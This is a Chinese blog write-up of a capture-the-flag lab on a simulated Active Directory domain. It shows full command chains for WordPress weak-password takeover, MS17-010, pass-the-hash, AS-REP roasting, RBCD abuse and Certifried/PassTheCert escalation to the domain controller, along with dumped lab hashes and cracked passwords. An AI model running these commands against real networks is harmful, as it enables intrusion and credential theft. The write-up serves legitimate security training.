---
title: "春秋云镜 2022 网鼎杯半决赛复盘 Writeup"
date: 2023-08-20T11:07:08+08:00
lastmod: 2023-08-20T11:07:08+08:00
draft: false
author: "X1r0z"

tags: ['adcs', 'kerberos', 'windows']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

春秋云镜 2022 网鼎杯半决赛复盘 Writeup

<!--more-->

## flag01

fscan

```shell
   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 39.99.159.63    is alive
[*] Icmp alive hosts len is: 1
39.99.159.63:80 open
39.99.159.63:22 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle: http://39.99.159.63       code:200 len:39962  title:XIAORANG.LAB
已完成 2/2
[*] 扫描结束,耗时: 37.649430375s
```

80 wordpress

wpscan

```shell
$ wpscan --url http://39.99.159.63/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.24
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://39.99.159.63/ [39.99.159.63]
[+] Started: Sat Aug 19 15:07:53 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://39.99.159.63/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://39.99.159.63/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://39.99.159.63/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://39.99.159.63/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.2.2 identified (Outdated, released on 2023-05-20).
 | Found By: Rss Generator (Passive Detection)
 |  - http://39.99.159.63/index.php/feed/, <generator>https://wordpress.org/?v=6.2.2</generator>
 |  - http://39.99.159.63/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.2.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://39.99.159.63/wp-content/themes/twentytwentyone/
 | Latest Version: 1.8 (up to date)
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://39.99.159.63/wp-content/themes/twentytwentyone/readme.txt
 | Style URL: http://39.99.159.63/wp-content/themes/twentytwentyone/style.css?ver=1.8
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://39.99.159.63/wp-content/themes/twentytwentyone/style.css?ver=1.8, Match: 'Version: 1.8'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <===============> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Aug 19 15:07:58 2023
[+] Requests Done: 170
[+] Cached Requests: 5
[+] Data Sent: 42.595 KB
[+] Data Received: 465.271 KB
[+] Memory used: 462.828 MB
[+] Elapsed time: 00:00:05
```

没啥东西

http://39.99.159.63/wp-admin/

弱口令 admin/123456

![image-20230819151145853](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308191511886.png)

改 template 404 文件 getshell

http://39.99.159.63/wp-content/themes/twentytwentyone/404.php

flag01

![image-20230819151302516](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308191513541.png)

## flag02

内网信息

```shell
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.15.26  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe07:9253  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:07:92:53  txqueuelen 1000  (Ethernet)
        RX packets 47543  bytes 55315984 (55.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 23109  bytes 8399886 (8.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 696  bytes 60135 (60.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 696  bytes 60135 (60.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

fscan

```shell
172.22.15.18:139 open
172.22.15.18:80 open
172.22.15.24:80 open
172.22.15.26:80 open
172.22.15.26:22 open
172.22.15.13:139 open
172.22.15.24:3306 open
172.22.15.13:445 open
172.22.15.35:445 open
172.22.15.18:445 open
172.22.15.24:445 open
172.22.15.35:139 open
172.22.15.24:139 open
172.22.15.13:135 open
172.22.15.35:135 open
172.22.15.18:135 open
172.22.15.24:135 open
172.22.15.13:88 open
[*] NetInfo:
[*]172.22.15.24
   [->]XR-WIN08
   [->]172.22.15.24
[*] NetBios: 172.22.15.35    XIAORANG\XR-0687              
[*] NetInfo:
[*]172.22.15.18
   [->]XR-CA
   [->]172.22.15.18
[*] NetInfo:
[*]172.22.15.35
   [->]XR-0687
   [->]172.22.15.35
[*] NetBios: 172.22.15.13    [+] DC:XR-DC01.xiaorang.lab          Windows Server 2016 Standard 14393
[*] 172.22.15.13  (Windows Server 2016 Standard 14393)
[*] NetInfo:
[*]172.22.15.13
   [->]XR-DC01
   [->]172.22.15.13
[+] 172.22.15.24	MS17-010	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
[*] NetBios: 172.22.15.18    XR-CA.xiaorang.lab                  Windows Server 2016 Standard 14393
[*] NetBios: 172.22.15.24    WORKGROUP\XR-WIN08                  Windows Server 2008 R2 Enterprise 7601 Service Pack 1
[*] WebTitle: http://172.22.15.26       code:200 len:39962  title:XIAORANG.LAB
[*] WebTitle: http://172.22.15.24       code:302 len:0      title:None 跳转url: http://172.22.15.24/www
[*] WebTitle: http://172.22.15.18       code:200 len:703    title:IIS Windows Server
[+] http://172.22.15.18 poc-yaml-active-directory-certsrv-detect 
[*] WebTitle: http://172.22.15.24/www/sys/index.php code:200 len:135    title:None
```

整理信息

```shell
172.22.15.13 XR-DC01
172.22.15.18 80 XR-CA ADCS
172.22.15.24 80,3306 XR-WIN08 MS17-010
172.22.15.26 本机
172.22.15.35 XR-0687
```

http://172.22.15.24/

ZDOO, OA 系统, 没啥漏洞

![image-20230819152116389](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308191521415.png)

于是去打 ms17-010

注意 msfconsole + proxychains 要打两次, 第二次才成功 (?)

![image-20230819152433848](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308191524877.png)

hashdump

```shell
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e52d03e9b939997401466a0ec5a9cbc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

psexec 过去拿到 flag02

```shell
proxychains psexec.py administrator@172.22.15.24 -hashes ':0e52d03e9b939997401466a0ec5a9cbc' -codec gbk
```

![image-20230819152729297](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308191527335.png)

## flag03

改 administrator 密码, rdp 过去翻 phpstudy mysql 密码

![image-20230819153154320](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308191531353.png)

```
root root@#123
```

连接 mysql 然后导出 OA 用户列表 (经典 AS-REP Roasting, 或者是先枚举用户名再跑 rockyou)

![image-20230819153326208](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308191533585.png)

当然也可以在后台导出, 同样是弱口令 admin/123456

![image-20230819153721766](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308191537801.png)

AS-REP Roasting

```shell
proxychains getNPUsers.py xiaorang.lab/ -dc-ip 172.22.15.13 -usersfile user.txt -request -outputfile hash.txt
```

hash

```shell
$krb5asrep$23$huachunmei@XIAORANG.LAB:0f48e917bf781eec69b0bd3ee9e05b6b$4700fc26eadd9b60b6efb2c0cd5b59d5b084b6235b7c2e4a6936d9778ab9dd61695152c51c640b065d22516c8ce2000782fdc494cc67b492aef65f737d772db3422cf39d51431c1731769b5a44330e0939d52e6cdbdb6fe72bc543a8105a5791975ae1d6066ffa5c514294f9f651260ab49f39ec97a6ac9d3f1cce7846bdf8fb0f0248c820216f911e127fcc500c8b3d8f84de129999937617188aa91c5aea513fa7c21211caf35de3a4b0b7638aa27584b42c24242a6e5101451ec5e05652c58760af58025c6a7c7a8a2bde74756b6da2a037e181a37492b1ec55b487441d44e3c0ebc159bcb348e7611f86
$krb5asrep$23$lixiuying@XIAORANG.LAB:041514fabe6d2a6e047f3dee67e4f70a$7e56418fc68c4f26c3070c4ab9e99997708d4f3e3c26be8a9649adc152f434214722c14bca7fe5e820d837c0ebf74de06cc0f5d220fb436272957511592262a5becf89955e1c6a5473ab47895e9eec9831c0250ba06925e28c07f0887e48c6fa41f3f5fd90ba6b7bcb5da9696daad05dc12bc7a51075d568a30692d08d1c7a64c8c2d4b748cb133a7d285853b200237df63fb64c152fe7b595eee0145827ee1f730f8238a2e517efec13b468ea5a21ed15fefd68eadd2cf75004b1424567df30125e11820f766198b695656ca5d98f73d586885e00e918d38be6d33b8636356186196f7d45c73555f2e0e2d0
```

hashcat 结果

```shell
lixiuying:winniethepooh
huachunmei:1qaz2wsx
```

crackmapexec rdp

![image-20230819154101066](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308191541098.png)

![image-20230819154139754](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308191541784.png)

都能连过去, 但是先别急, 跑一下 bloodhound 收集信息

```shell
proxychains bloodhound-python -u lixiuying -p winniethepooh -d xiaorang.lab -c all -ns 172.22.15.13 --zip --dns-tcp
```

![image-20230819154721461](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308191547497.png)

可以看到 lixiuying 对 XR-0687 具有 GenericWrite 权限 (盲猜是因为 Creator-SID)

那么直接去走一波配置 RBCD 的流程拿到 flag03

```shell
proxychains addcomputer.py xiaorang.lab/lixiuying:'winniethepooh' -dc-ip 172.22.15.13 -dc-host xiaorang.lab -computer-name 'TEST$' -computer-pass 'P@ssw0rd'

proxychains rbcd.py xiaorang.lab/lixiuying:'winniethepooh' -dc-ip 172.22.15.13 -action write -delegate-to 'XR-0687$' -delegate-from 'TEST$'

proxychains getST.py xiaorang.lab/'TEST$':'P@ssw0rd' -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13

proxychains psexec.py administrator@XR-0687.xiaorang.lab -k -no-pass -dc-ip 172.22.15.13
```

![image-20230819155441206](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308191554245.png)

## flag04

根据题目描述猜测要打 AD CS

用 certipy 先枚举一遍可利用的证书模版

```shell
$ proxychains certipy find -u 'lixiuying@xiaorang.lab' -p 'winniethepooh' -dc-ip 172.22.15.13 -vulnerable -stdout
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'xiaorang-XR-CA-CA' via CSRA
[!] Got error while trying to get CA configuration for 'xiaorang-XR-CA-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'xiaorang-XR-CA-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'xiaorang-XR-CA-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : xiaorang-XR-CA-CA
    DNS Name                            : XR-CA.xiaorang.lab
    Certificate Subject                 : CN=xiaorang-XR-CA-CA, DC=xiaorang, DC=lab
    Certificate Serial Number           : 3ECFB0112E93BE9041059FA6DBB3C35A
    Certificate Validity Start          : 2023-06-03 07:19:59+00:00
    Certificate Validity End            : 2028-06-03 07:29:58+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : XIAORANG.LAB\Administrators
      Access Rights
        ManageCa                        : XIAORANG.LAB\Administrators
                                          XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Enterprise Admins
        ManageCertificates              : XIAORANG.LAB\Administrators
                                          XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Enterprise Admins
        Enroll                          : XIAORANG.LAB\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
Certificate Templates                   : [!] Could not find any certificate templates
```

只存在 ESC8, 虽然不是不能打, 但毕竟是 NTLM Relay 稍微有点麻烦

于是又去试了试看是否存在 Certifried (CVE-2022–26923)

```shell
$ proxychains certipy account create -user 'TEST2$' -pass 'P@ssw0rd' -dns XR-DC01.xiaorang.lab -dc-ip 172.22.15.13 -u lixiuying -p 'winniethepooh'
[proxychains] config file found: /usr/local/etc/proxychains.conf
[proxychains] preloading /usr/local/lib/libproxychains4.dylib
[proxychains] DLL init: proxychains-ng 4.16-git-13-g133e06b
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Creating new account:
    sAMAccountName                      : TEST2$
    unicodePwd                          : P@ssw0rd
    userAccountControl                  : 4096
    servicePrincipalName                : HOST/TEST2
                                          RestrictedKrbHost/TEST2
    dnsHostName                         : XR-DC01.xiaorang.lab
[*] Successfully created account 'TEST2$' with password 'P@ssw0rd
```

添加成功了, 那么继续按流程走下去

申请证书模版

```shell
$ proxychains certipy req -u 'TEST2$@xiaorang.lab' -p 'P@ssw0rd' -ca 'xiaorang-XR-CA-CA' -target 172.22.15.18 -template 'Machine'
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 7
[*] Got certificate with DNS Host Name 'XR-DC01.xiaorang.lab'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'xr-dc01.pfx'
```

在申请 TGT 的时候出现了问题

```shell
$ proxychains certipy auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: xr-dc01$@xiaorang.lab
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

报错 `KDC_ERR_PADATA_TYPE_NOSUPP`

参考:

[https://whoamianony.top/posts/pass-the-certificate-when-pkinit-is-nosupp/](https://whoamianony.top/posts/pass-the-certificate-when-pkinit-is-nosupp/)

[https://github.com/AlmondOffSec/PassTheCert](https://github.com/AlmondOffSec/PassTheCert)

大致就是 AD 默认支持两种协议的证书身份验证: Kerberos PKINIT 协议和 Schannel

然后这里的报错估计是 `域控制器没有安装用于智能卡身份验证的证书` ? 所以可以尝试 Schannel

即通过 Schannel 将证书传递到 LDAPS, 修改 LDAP 配置 (例如配置 RBCD / DCSync), 进而获得域控权限

whoami

```shell
$ proxychains python3 passthecert.py -action whoami -crt user.crt -key user.key -domain xiaorang.lab -dc-ip 172.22.15.13
Impacket v0.12.0.dev1+20230803.144057.e2092339 - Copyright 2023 Fortra

[*] You are logged in as: XIAORANG\XR-DC01$
```

利用上面生成的 pfx 证书配置到域控的 RBCD, 注意先得把 pfx 导出为 .key 和 .crt 两个文件

```shell
$ proxychains python3 passthecert.py -action write_rbcd -crt user.crt -key user.key -domain xiaorang.lab -dc-ip 172.22.15.13 -delegate-to 'XR-DC01$' -delegate-from 'TEST$'
Impacket v0.12.0.dev1+20230803.144057.e2092339 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] TEST$ can now impersonate users on XR-DC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     TEST$        (S-1-5-21-3745972894-1678056601-2622918667-1147)
```

最后申请 ST, psexec 连接拿到 flag04

![image-20230819161008758](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308191610800.png)